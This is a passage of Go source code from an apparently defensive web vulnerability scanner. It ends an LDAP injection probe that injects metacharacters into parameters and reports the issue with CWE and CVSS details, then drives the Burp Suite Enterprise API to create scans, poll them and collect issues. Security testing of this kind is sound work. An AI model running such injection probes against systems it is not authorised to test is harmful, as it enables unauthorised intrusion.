			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
			resp.Body.Close()

			bodyStr := strings.ToLower(string(body))
			for _, kw := range lp.keywords {
				if strings.Contains(bodyStr, kw) {
					return []model.Finding{{
						ID:          "burp-ldap-injection",
						Category:    "injection",
						Severity:    model.SeverityHigh,
						Title:       "LDAP Injection detected",
						Description: "An LDAP metacharacter injected into a parameter triggered a server-side LDAP error or exposed LDAP-specific keywords in the response, indicating that user input is incorporated into LDAP queries without sanitisation.",
						Evidence:    fmt.Sprintf("param=%s payload=%q ldap_keyword=%q found=true status=%d", param, lp.payload, kw, resp.StatusCode),
						Recommendation: "Use an LDAP library with parameterised query support. Escape all special characters (*, (, ), \\, NUL) in LDAP filter input. Apply the principle of least privilege to the LDAP service account.",
						AffectedURL:       probeURL,
						AffectedParameter: param,
						OWASPCategory:     "OWASP A03:2021 - Injection",
						CWE:               "CWE-90",
						CVSSScore:         8.8,
						CVSSVector:        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
						MITRETechniques:   []string{"T1190"},
					}}
				}
			}
		}
	}
	return nil
}

// ── Burp Suite Enterprise REST API ────────────────────────────────────────────

// burpEnterpriseIssue mirrors the Burp Suite Enterprise issue shape.
type burpEnterpriseIssue struct {
	Name         string `json:"name"`
	Severity     string `json:"severity"`
	Confidence   string `json:"confidence"`
	Path         string `json:"path"`
	Description  string `json:"description"`
	Remediation  string `json:"remediation"`
	TypeIndex    int    `json:"type_index"`
}

// burpEnterpriseScan is the shape of the scan object in the Enterprise API.
type burpEnterpriseScan struct {
	ID     string `json:"id"`
	Status string `json:"status"`
}

// runBurpEnterpriseScan triggers a scan via the Burp Suite Enterprise REST API,
// polls for completion, and returns findings.
func runBurpEnterpriseScan(ctx context.Context, client *http.Client, apiURL, apiKey, target string) ([]model.Finding, string) {
	// ── 1. Create scan ────────────────────────────────────────────────────
	scanID, err := burpCreateScan(ctx, client, apiURL, apiKey, target)
	if err != nil {
		return nil, fmt.Sprintf("burp enterprise: create scan failed: %v", err)
	}

	// ── 2. Poll until scan completes (max 10 min) ─────────────────────────
	deadline := time.Now().Add(10 * time.Minute)
	for time.Now().Before(deadline) {
		select {
		case <-ctx.Done():
			return nil, "burp enterprise: context cancelled while polling scan"
		case <-time.After(30 * time.Second):
		}

		status, err := burpGetScanStatus(ctx, client, apiURL, apiKey, scanID)
		if err != nil {
			continue
		}
		if status == "succeeded" || status == "failed" || status == "paused" {
			break
		}
	}

	// ── 3. Retrieve issues ────────────────────────────────────────────────
	issues, err := burpGetScanIssues(ctx, client, apiURL, apiKey, scanID)
	if err != nil {
		return nil, fmt.Sprintf("burp enterprise: get issues failed: %v", err)
	}

	findings := make([]model.Finding, 0, len(issues))
	for _, issue := range issues {
		sev := burpSeverityToModel(issue.Severity)
		findings = append(findings, model.Finding{
			ID:             fmt.Sprintf("burp-enterprise-%d", issue.TypeIndex),
			Category:       "web_vulnerability",
			Severity:       sev,
			Title:          "Burp Enterprise: " + issue.Name,
			Description:    issue.Description,
			Recommendation: issue.Remediation,
			Evidence:       fmt.Sprintf("scan_id=%s path=%s confidence=%s", scanID, issue.Path, issue.Confidence),
			AffectedURL:    strings.TrimRight(target, "/") + issue.Path,
			OWASPCategory:  "OWASP Top 10",
		})
	}

	note := fmt.Sprintf("burp enterprise: scan_id=%s issues=%d", scanID, len(findings))
	return findings, note
}

func burpCreateScan(ctx context.Context, client *http.Client, apiURL, apiKey, target string) (string, error) {
	payload := map[string]interface{}{
		"scan_configurations": []map[string]string{{"type": "NamedConfiguration", "name": "Crawl and Audit - Balanced"}},
		"urls":                []string{target},
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, apiURL+"/api/v0.1/scan", bytes.NewReader(body))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "token "+apiKey)

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	if err != nil {
		return "", err
	}

	var scan burpEnterpriseScan
	if err := json.Unmarshal(respBody, &scan); err != nil {
		return "", fmt.Errorf("parse create-scan response: %w", err)
	}
	if scan.ID == "" {
		return "", fmt.Errorf("empty scan ID in response: %s", string(respBody))
	}
	return scan.ID, nil
}

func burpGetScanStatus(ctx context.Context, client *http.Client, apiURL, apiKey, scanID string) (string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet,
		apiURL+"/api/v0.1/scan/"+scanID, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Authorization", "token "+apiKey)

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	if err != nil {
		return "", err
	}

	var scan burpEnterpriseScan
	if err := json.Unmarshal(respBody, &scan); err != nil {
		return "", err
	}
	return scan.Status, nil
}

func burpGetScanIssues(ctx context.Context, client *http.Client, apiURL, apiKey, scanID string) ([]burpEnterpriseIssue, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet,
		apiURL+"/api/v0.1/scan/"+scanID+"/issue_events", nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "token "+apiKey)

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	if err != nil {
		return nil, err
	}

	var result struct {
		IssueEvents []struct {
			Issue burpEnterpriseIssue `json:"issue"`
		} `json:"issue_events"`
	}
	if err := json.Unmarshal(respBody, &result); err != nil {
		return nil, err
	}

	issues := make([]burpEnterpriseIssue, 0, len(result.IssueEvents))
	for _, ev := range result.IssueEvents {
		issues = append(issues, ev.Issue)
	}
	return issues, nil
}

func burpSeverityToModel(s string) model.Severity {
	switch strings.ToLower(s) {
	case "high":
		return model.SeverityHigh
	case "medium":
		return model.SeverityMedium
	case "low":
		return model.SeverityLow
	default:
		return model.SeverityInfo
	}
}
